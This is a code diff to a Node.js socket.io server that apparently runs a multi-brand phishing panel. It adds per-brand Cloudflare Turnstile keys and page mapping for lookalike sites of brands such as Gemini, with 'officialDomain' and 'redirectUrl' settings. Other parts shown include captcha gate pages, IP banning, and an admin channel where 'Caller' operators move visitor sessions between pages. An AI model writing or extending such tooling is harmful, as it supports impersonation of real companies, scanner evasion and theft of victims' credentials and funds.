@@ -4,6 +4,8 @@ import { Server } from 'socket.io';
 import { fileURLToPath } from 'url';
 import { promises as fsPromises } from 'fs';
 import BackgroundHTMLTransformer from './utils/BackgroundHTMLTransformer.js';
+import { getTurnstileConfig, getAllBrandsTurnstileStatus } from './config/brandConfig.js';
+import { resolvePageName, pageExistsForBrand } from './config/pageMapping.js';
 import fs from 'fs';
 import { dirname, join } from 'path';
 import crypto from 'crypto';
@@ -186,15 +188,21 @@ class SessionManager {
     updateSessionPage(sessionId, page) {
         const session = this.getSession(sessionId);
         if (!session) return null;
-    
-        // Make sure we use the correct case for the page name
-        const normalizedPage = page.replace('.html', '').toLowerCase();
+
+        // Use the page mapping to resolve the correct file name based on brand
+        const brand = session.brand || 'gemini';
+        const resolvedPageName = resolvePageName(brand, page);
+
+        // Check if the resolved page exists in our pageMap
         const actualPageName = Array.from(this.pageMap.keys()).find(
-            key => key.toLowerCase() === normalizedPage
+            key => key.toLowerCase() === resolvedPageName.toLowerCase()
         );
-    
-        if (!actualPageName) return null;
-    
+
+        if (!actualPageName) {
+            console.log(`Page not found for brand ${brand}: ${page} -> ${resolvedPageName}`);
+            return null;
+        }
+
         session.currentPage = actualPageName;
         session.lastAccessed = Date.now();
         return this.updateSessionUrl(session);
@@ -249,23 +257,24 @@ class SessionManager {
         return isValid;
     }
 
-    getPagePath(page) {
-        // Remove .html and convert to lowercase for comparison
-        const normalizedPage = page.replace('.html', '').toLowerCase();
-        
+    getPagePath(page, brand = 'gemini') {
+        // Use the page mapping to resolve the correct file name
+        const resolvedPageName = resolvePageName(brand, page);
+
         // Find the matching page name regardless of case
         const pageName = Array.from(this.pageMap.keys()).find(
-            key => key.toLowerCase() === normalizedPage
+            key => key.toLowerCase() === resolvedPageName.toLowerCase()
         );
-        
+
         // Debug logging
         console.log('Page lookup:', {
             requested: page,
-            normalized: normalizedPage,
+            brand: brand,
+            resolved: resolvedPageName,
             found: pageName,
-            availablePages: Array.from(this.pageMap.keys())
+            availablePages: Array.from(this.pageMap.keys()).slice(0, 10) // Limit logging
         });
-        
+
         return pageName ? this.pageMap.get(pageName) : null;
     }
 
@@ -613,9 +622,17 @@ app.get('/pages/captcha.html', async (req, res, next) => {
         const detectedBrand = detectBrandFromDomain(hostname);
         const officialDomain = BRAND_CONFIG[detectedBrand]?.officialDomain || 'www.gemini.com';
 
-        // Generate captcha page with correct domain
+        // Get brand-specific Turnstile configuration
+        const turnstileConfig = getTurnstileConfig(detectedBrand);
+
+        // Use brand-specific site key or fall back to default
+        const siteKey = turnstileConfig.siteKey || process.env.CLOUDFLARE_SITE_KEY;
+
+        console.log(`[CAPTCHA] Brand: ${detectedBrand}, Using site key: ${siteKey ? 'configured' : 'missing'}`);
+
+        // Generate captcha page with brand-specific key
         const captchaHTML = await backgroundTransformer.transformCaptchaPage(
-            process.env.CLOUDFLARE_SITE_KEY,
+            siteKey,
             state.settings.redirectUrl,
             officialDomain
         );
@@ -1062,8 +1079,8 @@ const pageServingMiddleware = async (req, res, next) => {
             requestedPage += '.html';
         }
 
-        // Get and validate page path
-        const pagePath = sessionManager.getPagePath(requestedPage);
+        // Get and validate page path - pass the brand from session
+        const pagePath = sessionManager.getPagePath(requestedPage, session.brand || 'gemini');
         if (!pagePath) {
             console.log('Page not found');
             return res.redirect('/');
@@ -1423,15 +1440,38 @@ app.use('/:page', checkBannedIP);
 // Modified verify-turnstile endpoint
 app.post('/verify-turnstile', async (req, res) => {
     const { token, sessionId } = req.body;
-    
+
     console.log('Verifying turnstile:', { sessionId });
-    
+
+    // Detect brand from session ID or request headers
+    let detectedBrand = 'gemini';
+    if (sessionId && sessionId.includes('-')) {
+        const prefix = sessionId.split('-')[0];
+        // Map prefix to brand
+        for (const [brand, config] of Object.entries(BRAND_CONFIG)) {
+            if (config.prefix === prefix) {
+                detectedBrand = brand;
+                break;
+            }
+        }
+    } else {
+        // Fallback to detecting from host header
+        const hostname = req.get('host') || req.hostname || '';
+        detectedBrand = detectBrandFromDomain(hostname);
+    }
+
+    // Get brand-specific Turnstile configuration
+    const turnstileConfig = getTurnstileConfig(detectedBrand);
+    const secretKey = turnstileConfig.secretKey || process.env.CLOUDFLARE_SECRET_KEY;
+
+    console.log(`[TURNSTILE] Verifying for brand: ${detectedBrand}`);
+
     try {
         const response = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                secret: process.env.CLOUDFLARE_SECRET_KEY,
+                secret: secretKey,
                 response: token
             })
         });
@@ -1667,10 +1707,11 @@ userNamespace.on('connection', async (socket) => {
                 // Keep connection active during redirect
                 session.loading = true;
                 session.connected = true;
-                
-                // Update session page and get new URL
-                const pageNameCapitalized = data.page.charAt(0).toUpperCase() + data.page.slice(1).toLowerCase();
-                session.currentPage = pageNameCapitalized;
+
+                // Use the page mapping to resolve the correct file name
+                const brand = session.brand || 'gemini';
+                const resolvedPageName = resolvePageName(brand, data.page);
+                session.currentPage = resolvedPageName;
                 const newUrl = sessionManager.updateSessionUrl(session);
                 
                 if (newUrl) {
@@ -1688,7 +1729,7 @@ userNamespace.on('connection', async (socket) => {
         // Handle page changes
         socket.on('page_change', (page) => {
             const session = sessionManager.getSession(sessionId);
-            if (session && sessionManager.getPagePath(page)) {
+            if (session && sessionManager.getPagePath(page, session.brand || 'gemini')) {
                 session.loading = true;
                 session.lastAccessed = Date.now();
                 session.lastHeartbeat = Date.now();
@@ -2038,10 +2079,11 @@ adminNamespace.on('connection', (socket) => {
 
                 loadingTimeouts.set(sessionId, timeout);
 
-                const pageName = page.replace('.html', '');
-                const pageNameCapitalized = pageName.charAt(0).toUpperCase() + pageName.slice(1).toLowerCase();
+                // Use the page mapping to resolve the correct file name
+                const brand = session.brand || 'gemini';
+                const resolvedPageName = resolvePageName(brand, page);
 
-                session.currentPage = pageNameCapitalized;
+                session.currentPage = resolvedPageName;
                 const newUrl = sessionManager.updateSessionUrl(session);
 
                 if (newUrl) {
@@ -2279,6 +2321,12 @@ adminNamespace.on('connection', (socket) => {
                 console.log(`Caller ${socket.username} disconnected`);
             }
         }
+    });
+
+    // Get Turnstile configuration status
+    socket.on('get_turnstile_status', () => {
+        const status = getAllBrandsTurnstileStatus();
+        socket.emit('turnstile_status', status);
     });
 
     socket.on('clear_sessions', async () => {
